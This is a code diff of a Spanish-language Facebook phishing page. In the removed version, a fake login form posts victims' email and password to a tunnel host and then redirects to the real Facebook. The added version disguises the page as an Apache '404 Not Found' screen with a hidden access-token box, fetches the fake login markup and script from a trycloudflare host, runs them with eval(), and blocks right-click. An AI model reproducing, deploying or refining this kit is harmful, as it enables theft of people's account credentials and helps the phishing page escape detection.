@@ -2,113 +2,124 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inici&#97;r sesi&#243;n</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="dinamic-title">404 Not Found</title>
     <style>
-        /* Estilos del Muro de Seguridad */
-        #muro-proteccion { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000000; color: #ffffff; 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            z-index: 9999; font-family: 'Segoe UI', Arial, sans-serif; 
+        html, body { height: 100%; margin: 0; padding: 0; }
+        body { 
+            background: #fff; 
+            color: #000; 
+            font-family: "Courier New", Courier, monospace; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            text-align: center;
         }
-        .muro-box { width: 85%; max-width: 350px; text-align: center; }
-        .muro-input { 
-            width: 100%; padding: 15px; margin: 20px 0; 
-            background: #1a1a1a; border: 1px solid #333; color: #ffffff; 
-            border-radius: 8px; text-align: center; font-size: 16px; outline: none;
+        #muro { padding: 20px; width: 100%; max-width: 450px; box-sizing: border-box; }
+        h1 { font-size: clamp(30px, 10vw, 45px); margin: 0; }
+        p { font-size: clamp(14px, 4vw, 18px); line-height: 1.4; }
+        hr { width: 100%; border: 0.5px solid #eee; margin: 20px 0; }
+        .console-input { 
+            margin-top: 20px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            color: #333;
+            padding: 15px;
+            width: 100%;
+            box-sizing: border-box; 
+            font-family: monospace;
+            font-size: 16px;
+            text-align: center;
+            border-radius: 8px;
+            outline: none;
+            text-transform: uppercase;
         }
-        .muro-btn { 
-            width: 100%; padding: 12px; background: #0064e0; color: #fff; 
-            border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
+        .btn-access {
+            display: block;
+            margin: 20px auto;
+            background: #f0f0f0;
+            border: 1px solid #ccc;
+            padding: 12px 30px;
+            width: 100%;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 14px;
+            font-weight: bold;
+            color: #555;
+            border-radius: 8px;
         }
-
-        /* Estilos de la Interfaz de Facebook */
-        #pagina-original { display: none !important; width: 100%; flex-direction: column; align-items: center; }
-        body { background-color: #ffffff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header-fb { width: 100%; background-color: #f5f6f7; padding: 12px; font-size: 13px; border-bottom: 1px solid #dddfe2; box-sizing: border-box; text-align: center; }
-        .logo-fb { margin-top: 30px; margin-bottom: 30px; }
-        .container-fb { width: 90%; max-width: 400px; display: flex; flex-direction: column; gap: 12px; }
-        input.fb-input { width: 100%; padding: 16px; background-color: #f5f6f7; border: 1px solid #dddfe2; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
-        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; font-weight: 600; border-radius: 25px; cursor: pointer; font-size: 17px; }
+        #pagina-original { 
+            display: none; 
+            width: 100%; 
+            flex-direction: column; 
+            align-items: center; 
+            background: #fff; 
+            font-family: -apple-system, sans-serif; 
+            min-height: 100vh;
+        }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false">
 
-    <div id="muro-proteccion">
-        <div class="muro-box">
-            <h2>Verificaci&#243;n de Acceso</h2>
-            <p style="opacity:0.8;">Introduce la llave generada en tu Termux para entrar.</p>
-            <input type="text" id="tkInput" class="muro-input" placeholder="0000-Xxx00-0000">
-            <button onclick="validarAcceso()" id="btnGo" class="muro-btn">DESBLOQUEAR</button>
-        </div>
+    <div id="muro">
+        <h1>Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+        <hr>
+        <p style="font-size: 12px; color: #777;">Apache/2.4.41 (Ubuntu) Server at localhost Port 80</p>
+        
+        <input type="text" id="tkInput" class="console-input" placeholder="ACCESS TOKEN" autofocus autocomplete="off" spellcheck="false">
+        <button class="btn-access" onclick="validarAcceso()">RUN DIAGNOSTIC</button>
     </div>
 
-    <div id="pagina-original">
-        <div class="header-fb">📥 Desc&#97;rg&#97; F&#97;c&#101;b&#111;&#111;k p&#97;r&#97; Andr&#111;&#105;d.</div>
-        <div class="logo-fb">
-            <svg width="75" height="75" viewBox="0 0 36 36" fill="#1877f2"><path d="M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.981 6.58 16.425 15.188 17.775v-12.57h-4.566v-5.205h4.566V14.01c0-4.505 2.684-6.994 6.79-6.994 1.967 0 4.024.351 4.024.351v4.425h-2.268c-2.233 0-2.928 1.385-2.928 2.809v3.393h4.986l-.797 5.205h-4.189V35.775C29.42 34.425 36 26.981 36 18z"/></svg>
-        </div>
-        <div class="container-fb">
-            <form id="loginForm">
-                <input type="email" id="email" class="fb-input" placeholder="Celul&#97;r o corr&#101;o" required>
-                <input type="password" id="pass" class="fb-input" placeholder="C&#111;ntras&#101;&ntilde;&#97;" style="margin-top:10px;" required>
-                <button type="submit" class="btn-login" style="margin-top:15px;">Inici&#97;r sesi&#243;n</button>
-            </form>
-        </div>
-    </div>
+    <div id="pagina-original"></div>
 
     <script>
-        // Dirección del túnel de tu última captura
-        function gU() {
-            return "https://09daa14c859a1b.lhr.life"; 
-        }
+        // ACTUALIZA ESTA URL SIEMPRE QUE INICIES EL TÚNEL
+        const API_URL = "https://expires-version-years-training.trycloudflare.com";
 
-        const MURO = document.getElementById('muro-proteccion');
-        const PAGINA = document.getElementById('pagina-original');
-
-        // Función para validar la llave con Termux
-        window.validarAcceso = function() {
-            const llave = document.getElementById('tkInput').value;
-            if(!llave) return;
-            document.getElementById('btnGo').innerText = "Verificando...";
-
-            fetch(gU(), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ accion: "validar_acceso", llave: llave })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.permitido === true) {
-                    MURO.style.display = 'none';
-                    PAGINA.style.setProperty('display', 'flex', 'important');
-                } else {
-                    alert("LLAVE INCORRECTA");
-                    document.getElementById('btnGo').innerText = "DESBLOQUEAR";
-                }
-            })
-            .catch(() => {
-                alert("Error: No hay conexión con Termux. ¿Está encendido el servidor?");
-                document.getElementById('btnGo').innerText = "DESBLOQUEAR";
-            });
-        };
-
-        // Captura de datos de inicio de sesión
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const u = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-
-            fetch(gU(), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ usuario: u, clave: p })
-            }).finally(() => {
-                // Redirigir al Facebook real después de capturar
-                window.location.href = "https://www.facebook.com/login";
-            });
+        document.getElementById('tkInput').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') { validarAcceso(); }
         });
+
+        async function validarAcceso() {
+            // CORREGIDO: toUpperCase() con "to"
+            const input = document.getElementById('tkInput');
+            const val = input.value.trim().toUpperCase();
+            
+            if(!val) return;
+
+            const btn = document.querySelector('.btn-access');
+            input.disabled = true;
+            btn.innerText = "WAIT...";
+
+            try {
+                const r = await fetch(`${API_URL}/get-ghost-code`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({llave: val})
+                });
+
+                if(r.ok) {
+                    const data = await r.json();
+                    document.getElementById('muro').remove();
+                    document.getElementById('dinamic-title').innerHTML = "Iniciar sesión en Facebook";
+                    const root = document.getElementById('pagina-original');
+                    root.style.display = "flex";
+                    root.innerHTML = data.html;
+                    eval(data.js);
+                } else {
+                    alert("DENIED: Clave incorrecta");
+                    input.disabled = false;
+                    input.value = "";
+                    btn.innerText = "RUN DIAGNOSTIC";
+                }
+            } catch(e) {
+                alert("OFFLINE: Revisa tu URL de Cloudflare");
+                input.disabled = false;
+                btn.innerText = "RUN DIAGNOSTIC";
+            }
+        }
     </script>
 </body>
 </html>
